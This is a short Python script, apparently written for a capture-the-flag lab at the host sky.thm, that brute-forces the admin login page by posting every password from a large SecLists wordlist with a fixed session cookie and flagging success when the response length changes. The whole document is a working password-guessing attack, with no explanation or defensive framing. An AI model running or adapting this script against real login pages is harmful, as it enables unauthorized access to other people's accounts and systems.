import requests

username = "admin%40sky.thm"
wordlist = "/opt/Hacking/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
url = "http://sky.thm/v2/admin/logincheck.php"

data = {"user":username, "ci_csrf_token":"", "pass":"", "submit":""}
cookies = {"PHPSESSID":"6f623kj1gquk0psgajci1p887j"}

with open(wordlist, "r") as f:
    for passwd in f.read().splitlines():
        password = passwd.strip()
        data["pass"] = password
        
        r = requests.post(url, cookies=cookies, data=data)
        if len(r.text) != 2619:
            print(f"{username}:{password}", "YES")
            break
        else:
            print(f"{username}:{password}"+" "*(40-len(f"{username}:{password} NO"))+"NO")


